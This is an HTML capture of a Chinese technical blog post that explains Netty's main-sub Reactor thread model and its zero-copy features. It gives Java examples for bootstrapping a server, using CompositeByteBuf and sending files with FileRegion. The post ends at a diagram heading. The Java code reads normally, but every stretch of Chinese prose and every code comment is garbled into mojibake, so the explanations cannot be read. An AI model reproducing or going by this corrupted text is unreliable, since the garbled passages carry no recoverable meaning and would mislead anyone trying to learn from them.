                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨åç«¯å¼€å‘çš„æ±Ÿæ¹–é‡Œï¼Œå¦‚æœä½ åªæ‡‚å¾— Spring MVC çš„Â <code>@Controller</code>Â å’ŒÂ <code>@Service</code>ï¼Œé‚£ä½ é¡¶å¤šç®—æ˜¯ä¸€ä¸ªåˆæ ¼çš„â€œä¸šåŠ¡å®ç°è€…â€ã€‚ä½†å¦‚æœä½ æƒ³è¸å…¥â€œæ¶æ„å¸ˆâ€çš„æ®¿å ‚ï¼Œ<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DNetty%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Netty&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Netty</a></strong>Â æ˜¯ä½ ç»å¯¹ç»•ä¸å¼€çš„ä¸€åº§é«˜å±±ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DDubbo%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Dubbo&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Dubbo</a>Â çš„åº•å±‚æ˜¯è°ï¼Ÿ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DRocketMQ%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=RocketMQ&amp;zhida_source=entity" ref="nofollow noopener noreferrer">RocketMQ</a>Â çš„é€šä¿¡å±‚æ˜¯è°ï¼Ÿ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BWebFlux%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Spring+WebFlux&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring WebFlux</a>Â çš„é»˜è®¤å¼•æ“æ˜¯è°ï¼Ÿ<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DElasticsearch%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Elasticsearch&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Elasticsearch</a>Â çš„èŠ‚ç‚¹é€šä¿¡é è°ï¼Ÿ</p>
<p>å…¨éƒ½æ˜¯ Nettyã€‚</p>
<p>å¾ˆå¤šåŒå­¦åœ¨é¢è¯•æ—¶èƒŒè¯µÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DReactor%2B%25E6%25A8%25A1%25E5%259E%258B%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Reactor+%E6%A8%A1%E5%9E%8B&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Reactor æ¨¡å‹</a>ã€é›¶æ‹·è´ï¼ŒèƒŒå¾—æ»šç“œçƒ‚ç†Ÿï¼Œä½†ä¸€åˆ°ç”Ÿäº§ç¯å¢ƒé‡åˆ° CPU é£™é«˜ã€å†…å­˜æ³„æ¼ã€ååé‡ä¸Šä¸å»ï¼Œå°±ä¸¤çœ¼ä¸€æŠ¹é»‘ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦ä»<strong>ç”Ÿäº§ç¯å¢ƒçš„å®æˆ˜è§†è§’</strong>ï¼Œå½»åº•æŠŠ Netty çš„é«˜æ€§èƒ½ä¹‹é“â€”â€”Reactor æ¨¡å‹ä¸<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3D%25E9%259B%25B6%25E6%258B%25B7%25E8%25B4%259D%25E6%258A%2580%25E6%259C%25AF%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=%E9%9B%B6%E6%8B%B7%E8%B4%9D%E6%8A%80%E6%9C%AF&amp;zhida_source=entity" ref="nofollow noopener noreferrer">é›¶æ‹·è´æŠ€æœ¯</a>æ‹†è§£å¼€æ¥ã€‚æˆ‘ä»¬è¦çœ‹çš„ä¸æ˜¯ Demoï¼Œè€Œæ˜¯æ’‘èµ·äº¿çº§æµé‡çš„æ¶æ„éª¨æ¶ã€‚</p>
<hr/>
<h3 data-id="heading-0">1. ä¸ºä»€ä¹ˆä½ çš„æœåŠ¡å¿«ä¸èµ·æ¥ï¼Ÿï¼ˆç—›ç‚¹ä¸å¼•å­ï¼‰</h3>
<p>åœ¨ä¼ ç»Ÿçš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DTomcat%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Tomcat&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Tomcat</a>ï¼ˆBIOæ¨¡å¼ï¼Œè™½ç„¶åæœŸæ”¹äº†NIOï¼Œä½†çº¿ç¨‹æ¨¡å‹ä¾ç„¶åé‡ï¼‰æ¶æ„ä¸‹ï¼Œæˆ‘ä»¬ä¹ æƒ¯äº†â€œä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªçº¿ç¨‹â€çš„æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼åœ¨å¹¶å‘é‡å‡ ç™¾çš„æ—¶å€™å¾ˆçˆ½ï¼Œä»£ç é€»è¾‘ç®€å•çº¿æ€§ã€‚</p>
<p>ä½†æ˜¯ï¼Œå½“å¹¶å‘é‡è¾¾åˆ°Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DC10K%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=C10K&amp;zhida_source=entity" ref="nofollow noopener noreferrer">C10K</a>ï¼ˆ1ä¸‡å¹¶å‘ï¼‰ç”šè‡³ C100K æ—¶ï¼Œçº¿ç¨‹åˆ‡æ¢ï¼ˆContext Switchï¼‰çš„å¼€é”€ä¼šæŠŠ CPU åƒå…‰ã€‚ä½ çš„æœåŠ¡å™¨ä¸æ˜¯åœ¨å¤„ç†ä¸šåŠ¡ï¼Œè€Œæ˜¯åœ¨å¿™ç€ç»™çº¿ç¨‹â€œæ¬å®¶â€ã€‚</p>
<p><strong>Netty çš„æ ¸å¿ƒå“²å­¦åªæœ‰ä¸¤ç‚¹ï¼š</strong></p>
<ol>
<li><strong>å°‘å¹²æ´»</strong>ï¼šèƒ½ä¸æ‹·è´æ•°æ®å°±ä¸æ‹·è´ï¼ˆZero Copyï¼‰ã€‚</li>
<li><strong>åˆ«é—²ç€</strong>ï¼šçº¿ç¨‹åˆ«å‚»ç­‰ IOï¼Œå¹²å®Œè¿™ä¸ªèµ¶ç´§å¹²é‚£ä¸ªï¼ˆReactor æ¨¡å‹ï¼‰ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-1">2. æ·±å…¥éª¨é«“ï¼šReactor æ¨¡å‹åœ¨ç”Ÿäº§ä¸­çš„å˜é˜µ</h3>
<p>Reactor æ¨¡å‹çš„æœ¬è´¨æ˜¯Â <strong>I/O å¤šè·¯å¤ç”¨</strong>ã€‚ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„æ˜¯Â <strong>ä¸»ä»å¤šçº¿ç¨‹æ¨¡å‹ï¼ˆMain-Sub Reactor Multi-Threadsï¼‰</strong> ã€‚</p>
<h3 data-id="heading-2">2.1 æ¶æ„å¸ˆçœ¼ä¸­çš„ Reactor</h3>
<p>æƒ³è±¡ä¸€ä¸ªé«˜æ¡£é¤å…ï¼ˆNetty Serverï¼‰ï¼š</p>
<ul>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DBossGroup%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=BossGroup&amp;zhida_source=entity" ref="nofollow noopener noreferrer">BossGroup</a>ï¼ˆä¸» Reactorï¼‰</strong> ï¼šé—¨å£çš„é¢†ä½å‘˜ã€‚ä»–åªè´Ÿè´£ä¸€ä»¶äº‹â€”â€”â€œæ¬¢è¿å…‰ä¸´â€ï¼ŒæŠŠå®¢äººé¢†è¿›é—¨ï¼ˆå»ºç«‹è¿æ¥ï¼‰ï¼Œç„¶åè¿…é€ŸæŠŠå®¢äººäº¤ç»™æœåŠ¡å‘˜ã€‚</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DWorkerGroup%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=WorkerGroup&amp;zhida_source=entity" ref="nofollow noopener noreferrer">WorkerGroup</a>ï¼ˆä» Reactorï¼‰</strong> ï¼šå¤§å…çš„æœåŠ¡å‘˜ã€‚æ¯ä¸ªäººè´Ÿè´£ä¸€ç‰‡åŒºåŸŸï¼ˆEventLoopï¼‰ã€‚ä»–è´Ÿè´£ç‚¹èœã€ä¸Šèœã€ç»“è´¦ï¼ˆè¯»å†™ IOã€ç¼–è§£ç ï¼‰ã€‚</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DBusiness%2BThread%2BPool%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=Business+Thread+Pool&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Business Thread Pool</a>ï¼ˆä¸šåŠ¡çº¿ç¨‹æ± ï¼‰</strong> ï¼šåå¨ã€‚å¦‚æœå®¢äººç‚¹çš„èœéœ€è¦ç‚–ä¸‰ä¸ªå°æ—¶ï¼ˆè€—æ—¶ä¸šåŠ¡é€»è¾‘ï¼‰ï¼ŒæœåŠ¡å‘˜ä¸èƒ½å‚»ç«™åœ¨é‚£ç­‰ï¼Œå¿…é¡»æŠŠå•å­æ‰”ç»™åå¨ï¼Œè‡ªå·±å»æœåŠ¡ä¸‹ä¸€æ¡Œã€‚</li>
</ul>
<h3 data-id="heading-3">2.2 ç”Ÿäº§çº§ä»£ç ç¤ºä¾‹ï¼šæ ‡å‡†ä¸»ä» Reactor å¯åŠ¨</h3>
<p>è¿™æ˜¯æ‰€æœ‰é«˜æ€§èƒ½ç½‘å…³ã€RPC æ¡†æ¶çš„èµ·æ‰‹å¼ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.howell.netty.reactor;

<span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 1: ç”Ÿäº§ç¯å¢ƒæ ‡å‡†çš„ Reactor ä¸»ä»æ¨¡å‹å¯åŠ¨ç±»
 * è¿è¡Œç»“æœè¯´æ˜ï¼šå¯åŠ¨åç›‘å¬ 8080 ç«¯å£ï¼ŒBoss çº¿ç¨‹æ± å¤„ç†è¿æ¥ï¼ŒWorker çº¿ç¨‹æ± å¤„ç† IOã€‚
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyServer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. BossGroup: ä¸“é—¨è´Ÿè´£ Accept äº‹ä»¶ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®çº¿ç¨‹æ•°ä¸º 1ï¼Œå› ä¸ºç›‘å¬ç«¯å£é€šå¸¸å°±ä¸€ä¸ª</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>(<span class="hljs-number">1</span>);
        
        <span class="hljs-comment">// 2. WorkerGroup: ä¸“é—¨è´Ÿè´£ Read/Write äº‹ä»¶ï¼Œé»˜è®¤çº¿ç¨‹æ•°æ˜¯ CPU æ ¸æ•° * 2</span>
        <span class="hljs-comment">// ç”Ÿäº§ç»éªŒï¼šå¦‚æœæ˜¯è®¡ç®—å¯†é›†å‹ä»»åŠ¡ï¼Œè¿™é‡Œçº¿ç¨‹æ•°è¦è°ƒå°ï¼›å¦‚æœæ˜¯ IO å¯†é›†å‹ï¼Œä¿æŒé»˜è®¤æˆ–å¾®è°ƒ</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            b.group(bossGroup, workerGroup)
             .channel(NioServerSocketChannel.class)
             <span class="hljs-comment">// 3. BACKLOG: ç”Ÿäº§ç¯å¢ƒå¿…é¡»è°ƒä¼˜ï¼Œæ§åˆ¶ TCP ä¸‰æ¬¡æ¡æ‰‹å…¨è¿æ¥é˜Ÿåˆ—çš„å¤§å°</span>
             <span class="hljs-comment">// å¦‚æœå¹¶å‘æé«˜ï¼Œè¿™ä¸ªå€¼å¤ªå°ä¼šå¯¼è‡´è¿æ¥è¢«æ‹’ç»</span>
             .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">1024</span>) 
             .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                 <span class="hljs-meta">@Override</span>
                 <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> {
                     <span class="hljs-comment">// æ³¨å†Œ Handler</span>
                     ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBusinessHandler</span>());
                 }
             });

            System.out.println(<span class="hljs-string">"Server started on port: "</span> + port);
            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.bind(port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            bossGroup.shutdownGracefully();
            workerGroup.shutdownGracefully();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2.3 é€»è¾‘å¯è§†åŒ–ï¼šReactor äº¤äº’å›¾</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f6565b7e8ae47e989ffa85701ab892d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667435&amp;x-signature=po2JulQ7dMM%2B%2FqW8sqhlQULwwnU%3D" alt="" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">3. é›¶æ‹·è´ï¼ˆZero Copyï¼‰ï¼šNetty çš„â€œç©ºé—´æŠ˜å â€æœ¯</h3>
<p>æ‰€è°“çš„â€œé›¶æ‹·è´â€ï¼Œåœ¨ OS å±‚é¢å’Œ Netty å±‚é¢æœ‰ä¸åŒçš„å«ä¹‰ã€‚æ¶æ„å¸ˆå¿…é¡»åˆ†æ¸…æ¥šã€‚</p>
<ol>
<li><strong>OS å±‚é¢</strong>ï¼šé¿å…æ•°æ®åœ¨â€œç”¨æˆ·æ€â€å’Œâ€œå†…æ ¸æ€â€ä¹‹é—´æ¥å›æ‹·è´ï¼ˆå¦‚Â <code>mmap</code>,Â <code>sendfile</code>ï¼‰ã€‚</li>
<li><strong>Netty å±‚é¢</strong>ï¼šé¿å… JVM å †å†…å­˜ä¸­ byte æ•°ç»„çš„æ‹·è´ï¼Œé€šè¿‡é€»è¾‘ç»„åˆä»£æ›¿ç‰©ç†å¤åˆ¶ã€‚</li>
</ol>
<h3 data-id="heading-6">3.1 åœºæ™¯ä¸€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DCompositeByteBuf%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=CompositeByteBuf&amp;zhida_source=entity" ref="nofollow noopener noreferrer">CompositeByteBuf</a>ï¼ˆé€»è¾‘ç»„åˆï¼‰</h3>
<p>åœ¨åšåè®®æ‹¼æ¥æ—¶ï¼ˆæ¯”å¦‚ Header + Bodyï¼‰ï¼Œä¼ ç»Ÿåšæ³•æ˜¯åˆ›å»ºä¸€ä¸ªå¤§æ•°ç»„ï¼ŒæŠŠ Header å’Œ Body æ‹·è¿›å»ã€‚ Netty çš„åšæ³•æ˜¯ï¼šæˆ‘ä¸æ‹·ï¼Œæˆ‘æ‹¿ä¸ªâ€œå¤¹å­â€æŠŠå®ƒä»¬å¤¹åœ¨ä¸€èµ·ï¼Œé€»è¾‘ä¸Šçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ•´ä½“ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">package com.howell.netty.zerocopy;

<span class="hljs-keyword">import</span> io.netty.buffer.ByteBuf;
<span class="hljs-keyword">import</span> io.netty.buffer.CompositeByteBuf;
<span class="hljs-keyword">import</span> io.netty.buffer.Unpooled;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 2: ä½¿ç”¨ CompositeByteBuf å®ç°åº”ç”¨å±‚é›¶æ‹·è´
 * è¿è¡Œç»“æœè¯´æ˜ï¼šå°† header å’Œ body ç»„åˆï¼Œåº•å±‚ä¸å‘ç”Ÿå†…å­˜å¤åˆ¶ï¼Œä½†åœ¨é€»è¾‘ä¸Šæ˜¯ä¸€ä¸ªå®Œæ•´çš„ ByteBufã€‚
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZeroCopyComposite</span> {

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">compositeExample</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// æ¨¡æ‹Ÿ Header</span>
        ByteBuf header = Unpooled.<span class="hljs-built_in">wrappedBuffer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]{<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>});
        <span class="hljs-comment">// æ¨¡æ‹Ÿ Body</span>
        ByteBuf body = Unpooled.<span class="hljs-built_in">wrappedBuffer</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]{<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>});

        <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªé€»è¾‘è§†å›¾ï¼Œä¸æ˜¯ç‰©ç†æ‹·è´</span>
        CompositeByteBuf compositeByteBuf = Unpooled.<span class="hljs-built_in">compositeBuffer</span>();
        
        <span class="hljs-comment">// æ³¨æ„ï¼šå¿…é¡»è®¾ç½® increaseWriterIndex ä¸º trueï¼Œå¦åˆ™ writerIndex ä¸ä¼šåŠ¨</span>
        compositeByteBuf.<span class="hljs-built_in">addComponents</span>(<span class="hljs-literal">true</span>, header, body);

        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Composite Readable Bytes: "</span> + compositeByteBuf.<span class="hljs-built_in">readableBytes</span>()); <span class="hljs-comment">// è¾“å‡º 6</span>
        
        <span class="hljs-comment">// éå†ï¼Œå¦‚åŒéå†ä¸€ä¸ªè¿ç»­æ•°ç»„</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; compositeByteBuf.<span class="hljs-built_in">readableBytes</span>(); i++) {
            System.out.<span class="hljs-built_in">print</span>(compositeByteBuf.<span class="hljs-built_in">getByte</span>(i) + <span class="hljs-string">" "</span>);
        }
        <span class="hljs-comment">// è¿è¡Œç»“æœ: 1 2 3 4 5 6</span>
    }
}
</code></pre>
<h3 data-id="heading-7">3.2 åœºæ™¯äºŒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269047975%26content_type%3DArticle%26match_order%3D1%26q%3DFileRegion%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269047975&amp;content_type=Article&amp;match_order=1&amp;q=FileRegion&amp;zhida_source=entity" ref="nofollow noopener noreferrer">FileRegion</a>ï¼ˆOS çº§é›¶æ‹·è´ï¼‰</h3>
<p>è¿™æ˜¯æ–‡ä»¶æœåŠ¡å™¨ã€é™æ€èµ„æºç½‘å…³çš„æ ¸å¿ƒæŠ€æœ¯ã€‚ç›´æ¥åˆ©ç”¨Â <code>FileChannel.transferTo</code>ï¼Œæ•°æ®ç›´æ¥ä»ç£ç›˜ -&gt; å†…æ ¸ç¼“å†²åŒº -&gt; ç½‘å¡ï¼Œæ ¹æœ¬ä¸ç»è¿‡ JVM å†…å­˜ã€‚</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.howell.netty.zerocopy;

<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">ChannelHandlerContext</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">DefaultFileRegion</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">FileRegion</span>;
<span class="hljs-keyword">import</span> io.netty.channel.<span class="hljs-type">SimpleChannelInboundHandler</span>;

<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">File</span>;
<span class="hljs-keyword">import</span> java.io.<span class="hljs-type">RandomAccessFile</span>;

<span class="hljs-comment">/**
 * ç¤ºä¾‹ 3: ä½¿ç”¨ FileRegion å®ç° OS çº§åˆ«çš„é›¶æ‹·è´æ–‡ä»¶ä¼ è¾“
 * è¿è¡Œç»“æœè¯´æ˜ï¼šæ•°æ®ç›´æ¥é€šè¿‡ DMA ä»ç£ç›˜å‘é€åˆ°ç½‘å¡ï¼ŒCPU å ç”¨æä½ã€‚
 */</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileZeroCopyHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SimpleChannelInboundHandler&lt;String&gt;</span> </span>{

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void channelRead0(<span class="hljs-type">ChannelHandlerContext</span> ctx, <span class="hljs-type">String</span> msg) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> {
        <span class="hljs-type">File</span> file = <span class="hljs-keyword">new</span> <span class="hljs-type">File</span>(<span class="hljs-string">"/data/large-file.mp4"</span>);
        <span class="hljs-type">RandomAccessFile</span> raf = <span class="hljs-keyword">new</span> <span class="hljs-type">RandomAccessFile</span>(file, <span class="hljs-string">"r"</span>);
        
        <span class="hljs-comment">// å®šä¹‰æ–‡ä»¶åŒºåŸŸ</span>
        <span class="hljs-type">FileRegion</span> region = <span class="hljs-keyword">new</span> <span class="hljs-type">DefaultFileRegion</span>(
                raf.getChannel(), <span class="hljs-number">0</span>, raf.length());

        <span class="hljs-comment">// Netty ä¼šè‡ªåŠ¨è°ƒç”¨ transferTo</span>
        <span class="hljs-comment">// è¿™è¡Œä»£ç æ˜¯æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨æ€§èƒ½æå‡ 10 å€çš„å…³é”®</span>
        ctx.writeAndFlush(region);
        
        <span class="hljs-comment">// æ³¨æ„ï¼šå®é™…ç”Ÿäº§ä¸­éœ€è¦ç›‘å¬ Future æ¥å…³é—­ rafï¼Œè¿™é‡Œç®€åŒ–å¤„ç†</span>
    }
}
</code></pre>
<h3 data-id="heading-8">3.3 é›¶æ‹·è´åŸç†å›¾è§£</h3>
